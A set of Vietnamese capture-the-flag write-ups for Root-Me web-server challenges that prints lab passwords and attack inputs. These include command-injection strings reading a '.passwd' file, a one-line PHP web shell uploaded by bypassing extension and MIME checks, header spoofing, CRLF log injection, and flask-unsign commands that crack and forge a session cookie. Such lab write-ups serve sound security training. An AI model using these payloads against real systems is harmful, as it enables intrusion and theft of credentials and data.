# Web - server

## Content

- [HTML - Source code](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#html---source-code)

- [HTTP - IP restriction bypass](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---ip-restriction-bypass)

- [HTTP - Open redirect](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---open-redirect)

- [HTTP - User-agent](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---user-agent)

- [Weak password](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#weak-password)

- [PHP - Command injection](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#php---command-injection)

- [API - Broken Access](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#api---broken-access)

- [Backup file](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#backup-file)

- [HTTP - Directory indexing](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---directory-indexing)

- [HTTP - Headers](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---headers)

- [HTTP - POST](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---post)

- [HTTP - Improper redirect](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---improper-redirect)

- [HTTP - Verb tampering](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---verb-tampering)

- [Install files](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#install-files)

- [Nginx - Alias Misconfiguration](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#nginx---alias-misconfiguration)

- [Nginx - Root Location Misconfiguration]()

- [API - Mass Assignment](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#api---mass-assignment)

- [CRLF](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#crlf)

- [File upload - Double extensions](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#file-upload---double-extensions)

- [File upload - MIME type](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#file-upload---mime-type)

- [Flask - Unsecure session](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#flask---unsecure-session)

- [HTTP - Cookies](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#http---cookies)

- [Insecure Code Management](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#insecure-code-management)

- [JWT - Introduction](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/Web_server.md#jwt---introduction)

- [XSS - Server Side]()

### HTML - Source code

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image.png?raw=true)

Start the challengenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image1.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image2.png?raw=true)

**Password: nZ^&@q5&sjJHev0**

### HTTP - IP restriction bypass

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image3.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image4.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image5.png?raw=true)

-> Không tìm được gì. 

Dựa vào mô tả thử thách "We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network"

-> Có thể liên quan đến địa chỉ mặc định mạng nội bộ `192.168.0.1`

Dựa vào thông tin được cung cấp trên website của thử thách "You should authenticate because you're not on the LAN." Kết hợp cùng thông tin từ mô tả thử thách, có thể liên quan đến `X-Forwarded-For` header, header chứa địa chi IP của client mỗi lần request đi qua proxy, header này có thể chứa `IP LAN` nếu request xuất phát từ mạng nội bộ. 

Request login trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image6.png?raw=true)

Thử thêm header `X-Forwarded-For: 192.168.0.1` và send request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image7.png?raw=true)

-> Khi thêm `X-Forwarded-For: 192.168.0.1`, server có thể nghĩ rằng request đến từ mạng nội bộ và cấp quyền truy cập đặc biệt. 

**Password: Ip_$po0Fing**

### HTTP - Open redirect

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image8.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image9.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image10.png?raw=true)

Có thể thấy 3 URL dẫn đến từng domain tương ứng Facebook, Twitter, Stack, nhưng lại có một tham số `h` đằng sau, giá trị tham số này trông như đã được băm. 

Thử băm `https://facebook.com` sử dụng thuật toán `md5`, thu được giá trị băm `a023cfbf5f1c39bdf8407f28b60cd134`, giống với giá trị `h` tương ứng với domain Facebook. 

Theo mô tả thử thách "Find a way to make a redirection to a domain other than those showed on the web page.". Thử request đến 1 domain khác là `https://youtube.com` với giá trị băm là `e62e24467ebdddf3fe7cc0e6970f01af`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image11.png?raw=true)

**Password: e6f8a530811d5a479812d7b82fc1a5c5**

### HTTP - User-agent

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image12.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image13.png?raw=true)

Request tới website trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image14.png?raw=true)

Dựa vào tên thử thách "User-agent", có vẻ liên quan đến `User-Agent` header, là header mô tả về browser phía client. 

Dựa vào thông tin website thử thách đưa ra: "Wrong user-agent: you are not the "admin" browser!", thử thay giá trị `User-Agent` header thành `admin` và send request: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image15.png?raw=true)

**Password: rr$Li9%L34qd1AAe27**

### Weak password

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image16.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image17.png?raw=true)

Thử nhập `username:admin` và `password:admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image18.png?raw=true)

**Password: admin**

### PHP - Command injection

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image19.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image20.png?raw=true)

Dựa vào mô tả thử thách "Find a vulnerabilty in this service and exploit it. You must manage to read index.php", thử truy cập `/index.php`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image21.png?raw=true)

-> Không đọc được. Thử nhập `index.php` và click submit:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image22.png?raw=true)

-> Cũng không xem được. 

Thử nhập `127.0.0.1`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image23.png?raw=true)

Thử nhập `127.0.0.1&&pwd`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image24.png?raw=true)

-> Câu lệnh `pwd` được thực thi, có thể website tồn tại lỗ hổng `Command Injection`. Thử nhập `127.0.0.1&&ls`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image25.png?raw=true)

-> Tìm được file `index.php`, thử nhập `127.0.0.1&&ls&&cat index.php`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image26.png?raw=true)

Xem response trong Burp Suite: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image27.png?raw=true)

-> Nội dung `index.php`:

    <?php 
    $flag = "".file_get_contents(".passwd")."";
    if(isset($_POST["ip"]) && !empty($_POST["ip"])){
            $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
            echo $response;
    }
    ?>

Qua nội dung đoạn mã, có thể flag nằm trong file `.passwd`, thử nhập `127.0.0.1&&cat .passwd`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image28.png?raw=true)

**Password: S3rv1ceP1n9Sup3rS3cure**

### API - Broken Access

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image29.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image30.png?raw=true)

Dựa vào mô tả thử thách "Your friend has set up a platform where you can register and post a private note. Everything is based on an API. Before setting up the Front-End, he asked you to check that everything was secure.", website này được dùng để user mới đăng ký, sau đó họ có thể tạo và xem ghi chú của mình một cách riêng tư, tất cả hoạt động thông qua API.

Một số API có thể thấy là tạo user, đăng nhập, xem thông tin user, tạo ghi chú. 

Thử sử dụng `/signup` API để tạo 1 user mới: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image31.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image32.png?raw=true)

Response trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image33.png?raw=true)

-> Có thể thấy request URL, request method, request params nhưng chưa thu được thông tin gì có thể khai thác. 

Tiếp tục thử `/login` API, sử dụng `username:user1` và `password:user1`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image34.png?raw=true)

Response trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image35.png?raw=true)

-> Cũng chưa thu được gì nhiều.

Tiếp tục thử API xem thông tin user `/user`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image36.png?raw=true)

Cần nhập user id, vấn đề là không biết id của user vừa tạo là gì. Thử nhập id là 1, 2, 3 thì response cũng đều hiển thị như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image37.png?raw=true)

-> ID của user vừa tạo là 6 và Request URL là `http://api-broken-access.challenge01.root-me.org/api/user`, thử truy cập URL `http://api-broken-access.challenge01.root-me.org/api/user/6` qua browser:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image38.png?raw=true)

Ý tưởng có thể khai thác là xem thông tin của user `admin`, cần tìm user_id của `admin`. 

Request yêu cầu xem thông tin user trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image39.png?raw=true)

Send request tới Intruder và Brute-force user_id: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image40.png?raw=true)

Payload option:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image41.png?raw=true)

Start attack và tìm ra thông tin của `admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image42.png?raw=true)

**Password: RM{E4sy_1d0r_0n_API}**

### Backup file

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image43.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image44.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image45.png?raw=true)

Không thu được thông tin gì. 

Thử nhập `username:admin` và `password:admin` và click connect: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image46.png?raw=true)

Thử thay `username:admin` thành `username:admin'--`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image47.png?raw=true)

Cũng không bypass được. 

Thử xem nội dung `/robots.txt`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image48.png?raw=true)

Không tìm thấy file. 

Thử dùng `dirsearch` xem có file nào bị ẩn trên website không:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image49.png?raw=true)

-> Tìm được file `index.php~` trả về status code 200. Thử tải file: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image50.png?raw=true)

Tìm được `username="ch11"` và `password="OCCY9AcNm1tj"`. Thử đăng nhập với thông tin này: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image51.png?raw=true)

**Password: OCCY9AcNm1tj**

### HTTP - Directory indexing

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image52.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image53.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image54.png?raw=true)

Tìm được URL `admin/pass.html`. Thử truy cập qua URL:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image55.png?raw=true)

Thử truy cập `pass.html`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image58.png?raw=true)

Không thu được gì.

Thử truy cập `/backup/`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image56.png?raw=true)

Thử truy cập `admin.txt`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image57.png?raw=true)

**Password: LINUX**

### HTTP - Headers

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image59.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image60.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image61.png?raw=true)

Không thu được gì.

Dựa vào mô tả thử thách: "Content is not the only part of an HTTP response!", thử xem request và response khi start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image62.png?raw=true)

Trong response có header `Header-RootMe-Admin` đang có giá trị `none`, thử thêm header này vào request `Header-RootMe-Admin: true`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image63.png?raw=true)

**Password: HeadersMayBeUseful**

### HTTP - POST

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image64.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image65.png?raw=true)

Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image66.png?raw=true)

Không thu được thông tin gì. 

Click `Give a try!`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image67.png?raw=true)

Một giá trị score ngẫu nhiên được hiển thị. Request khi click `Give a try!` trông như sau: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image68.png?raw=true)

Là 1 POST request có tham số `score` có giá trị đúng bằng giá trị được hiển thị lên website. Thử thay giá trị này thành `1000000` và send request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image69.png?raw=true)

**Password: H7tp_h4s_N0_s3Cr37S_F0r_y0U**

### HTTP - Improper redirect

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image70.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image71.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image72.png?raw=true)

Không thu được thông tin gì. 

Thử nhập `username:admin` và `password:admin`, click Login:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image73.png?raw=true)

-> Authentication Failed. 

Để ý request khi load trang web: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image74.png?raw=true)

Tham số `redirect` trên URL có vẻ không dùng để làm gì, thử xóa send request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image75.png?raw=true)

-> Response lại trang `login.php` ban đầu, thử xóa endpoint `/login.php` để ra ngoài trang chủ:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image76.png?raw=true)

**Password: ExecutionAfterRedirectIsBad**

### HTTP - Verb tampering

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image77.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image78.png?raw=true)

Thử nhập `username:admin` và `password:admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image79.png?raw=true)

Không có gì thay đổi. 

Thử xem request và response: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image80.png?raw=true)

Tại sao lại là phương thức `GET` khi yêu cầu login, thử thay thành `POST` và thêm 2 tham số `username` và `password` rồi gửi request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image81.png?raw=true)

Vẫn không được, có thể không dùng được phương thức `POST` vì không biết rõ tên cũng như giá trị của tham số truyền vào body. Thử thay thành 1 phương thức bất kỳ, ví dụ `PATCH` và gửi request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image82.png?raw=true)

**Password: a23e$dme96d3saez$$prap**

### Install files

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image83.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image84.png?raw=true)

Website trống, không hiển thị gì. Xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image85.png?raw=true)

Tìm được thông tin `/web-serveur/ch6/phpbb`, thử truy cập endpoint này: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image86.png?raw=true)

Tiếp tục xem source page: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image87.png?raw=true)

Không có thông tin gì. Thử dùng `dirsearch` để tìm xem có file ẩn không:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image88.png?raw=true)

Tìm được endpoint `/install`, thử truy cập: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image89.png?raw=true)

**Password: karambar**

### Nginx - Alias Misconfiguration

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image90.png?raw=true)

Access the lab:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image91.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image92.png?raw=true)

Tìm được endpoint `/assets/`, thử truy cập: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image93.png?raw=true)

Xuất hiện đường dẫn `../`. Thử truy cập `/assets../` (có thể xuất hiện lỗ hổng Path traversal): 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image94.png?raw=true)

Click xem file `flag.txt`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image95.png?raw=true)

**Password: RM{4lias_M1sC0nf_HuRtS!}**

### Nginx - Root Location Misconfiguration

![img](96)

![img](97)

Start the challenge:

![img](98)

Xem source page:

![img](99)

-> Tìm được root path `/etc/nginx/`. Thử truy cập:

![img](100)

Nội dung của trang không có ý nghĩa gì. 

### API - Mass Assignment

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image101.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image102.png?raw=true)

Tạo tài khoản với api `/api/signup`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image103.png?raw=true)

Execute: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image104.png?raw=true)

Login vào tài khoản:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image105.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image106.png?raw=true)

Thử execute GET `/api/user`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image107.png?raw=true)

Thử sử dụng PATCH request thay đổi `status` thành `admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image108.png?raw=true)

-> Method không được phép, chỉ cho phép `PUT`, `OPTIONS`, `HEAD`, `GET`. Thử thay đổi thành `PUT`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image109.png?raw=true)

Thông báo update thành công, gọi lại api `GET /api/user` để xác nhận:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image110.png?raw=true)

-> Thành công update status thành `admin`. 

Gọi api `GET /api/flag`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image111.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image112.png?raw=true)

**Password: RM{4lw4yS_ch3ck_0pt10ns_m3th0d}**

### CRLF

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image113.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image114.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image115.png?raw=true)

Không tìm được gì. Thử nhập `username:admin` và `password:admin`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image116.png?raw=true)

-> Xuất hiện thêm một thông báo `admin failed to authenticate.`

Thử nhập `username:abc` và `password:abc`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image117.png?raw=true)

-> Xuất hiện thêm một thông báo `abc failed to authenticate.`. Có vẻ website đang lấy ra `username` cộng với thông báo phía sau. Như vậy dựa vào log ban đầu của website, `admin` là 1 `username` hợp lệ. 

Dựa vào tên thử thách: `CRLF`, ám chỉ đây là lỗ hổng `CRLF`, là một lỗ hổng bảo mật trong đó kẻ tấn công thao túng phản hồi HTTP bằng cách chèn các ký tự `Carriage Return (CR)` và `Line Feed (LF)` (gọi chung là CRLF) vào tiêu đề phản hồi. Các ký tự này đánh dấu phần cuối của tiêu đề và điểm bắt đầu của một dòng mới trong phản hồi HTTP.

Bằng cách `chèn một chuỗi CRLF`, kẻ tấn công có thể `chia phản hồi thành hai phần`, kiểm soát hiệu quả cấu trúc của phản hồi HTTP. Điều này có thể dẫn đến các vấn đề bảo mật khác nhau, chẳng hạn như:

- Cross-Site Scripting (XSS): Chèn các tập lệnh độc hại vào phản hồi thứ hai.
- Nhiễm độc bộ nhớ cache: Buộc nội dung không chính xác được lưu trữ trong bộ nhớ cache.
- Thao tác tiêu đề: Thay đổi tiêu đề để đánh lừa người dùng hoặc hệ thống

Như vậy thử chèn payload vào `username`, dựa vào log ban đầu, cần chèn payload như nào để website in ra log như sau:

    admin authenticated.
    guest failed to authenticate.

Thay đổi request thành:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image118.png?raw=true)

Trong đó `%0d%0a` là `\r\n`. Gửi request này:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image119.png?raw=true)

Như vậy việc buộc website in ra log `admin authenticated.` đã lấy dược password.

**Password: rFSP&G0p&5uAg1%**

### File upload - Double extensions

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image120.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image121.png?raw=true)

Click vào upload:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image122.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image123.png?raw=true)

Thử upload 1 file `.jpeg`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image124.png?raw=true)

Request sẽ trông như sau:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image125.png?raw=true)

Tạo 1 file `my_shell.php` có nội dung như sau:

    <?php echo system($_GET['command']); ?>

Thử upload file này:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image126.png?raw=true)

Request sẽ trông như sau:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image127.png?raw=true)

-> Website trả về thông báo `Wrong file extension !`. Nghĩa là file extension `.php` không được chấp nhận. Thử thay tên file thành `my_shell.php.jpg` và sửa lại `Content-Type` header thành `image/jpeg` và upload lại:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image128.png?raw=true)

Gửi request này:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image129.png?raw=true)

Upload thành công payload. Truy cập đường dẫn nơi lưu trữ file upload và chèn tham số `command` với giá trị là `cat ../../../.passwd` (vì theo mô tả file này nằm tại root location):

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image130.png?raw=true)

**Password: Gg9LRz-hWSxqqUKd77-_q-6G8**

### File upload - MIME type

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image131.png?raw=true)

Start the challenge: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image132.png?raw=true)

Click upload:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image133.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image134.png?raw=true)

Thử upload 1 file `.jpg`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image135.png?raw=true)

-> Upload thành công. Request sẽ trông như sau:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image136.png?raw=true)

Tạo file `my_shell.php` có nội dung như sau: 

    <?php echo system($_GET['command']); ?>

Thử upload file `my_shell.php`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image137.png?raw=true)

-> Website trả về thông báo `Wrong file type!`. 

Request sẽ trông như sau:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image138.png?raw=true)

Thử thêm file extension `.jpg` vào sau tên file `my_shell.php` và gửi lại request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image139.png?raw=true)

-> Không upload được. Thử sửa lại tên file như ban đầu và sửa `Content-Type` header thành `image/jpeg` và gửi lại request:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image140.png?raw=true)

-> File upload thành công. Nhưng chưa biết thư mục nào lưu trữ file tải lên. Thử dùng `dirsearch` tìm ra endpoint lưu trữ file upload:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image141.png?raw=true)

Tìm được endpoint `/tmp` nhưng bị cấm truy cập. Click lại vào `upload` và chọn xem `my_shell`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image142.png?raw=true)

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image143.png?raw=true)

Thêm tham số `command=whoami`:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image144.png?raw=true)

Xác nhận chèn payload thành công. Thay đổi giá trị tham số `command` thành `cat ../../../.passwd` để đọc file từ root location:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image145.png?raw=true)

**Password: a7n4nizpgQgnPERy89uanf6T4**

### Flask - Unsecure session

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image146.png?raw=true)

Start the challenge:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image147.png?raw=true)

Request và response khi load trang web:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image148.png?raw=true)

Webserver trả về 1 session, thử decode với `jwt.io`: 

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image149.png?raw=true)

Truy cập trang Admin:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image150.png?raw=true)

Request sẽ trông như sau:

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image151.png?raw=true)

Như vậy, ý tưởng là có thể thay giá trị trong header của jwt thành để sinh jwt mới:

    {
        "admin": "true",
        "username": "admin",
    }

Nhưng hiện tại không có chữ ký, có thể phần chữ ký trong jwt gốc là 1 giá trị không hợp lệ. 

Sử dụng tool `flask-unsign` để brute-force tìm ra chữ ký hợp lệ, sử dụng lệnh:

    flask-unsign --wordlist rockyou.txt --unsign --no-literal-eval --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z-xybg.BHYr8gtgg5SNHzb-smjqMfVIxM0'

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image152.png?raw=true)

Tìm ra chữ ký của jwt gốc là `s3cr3t`. Tiếp tục sử dụng `flask-unsign` để sinh jwt mới với header như trên và chữ ký vừa tìm được, dùng lệnh:

    flask-unsign --sign --cookie '{"admin": "true", "username" : "admin"}' --secret 's3cr3t'

![img](https://github.com/DucThinh47/Rootme-CTF/blob/main/Web-Server/images/image153.png?raw=true)

-> JWT mới: `eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.Z-x3MA.xeNloJaT-uLi5qKaJpG2n9Gipi4`

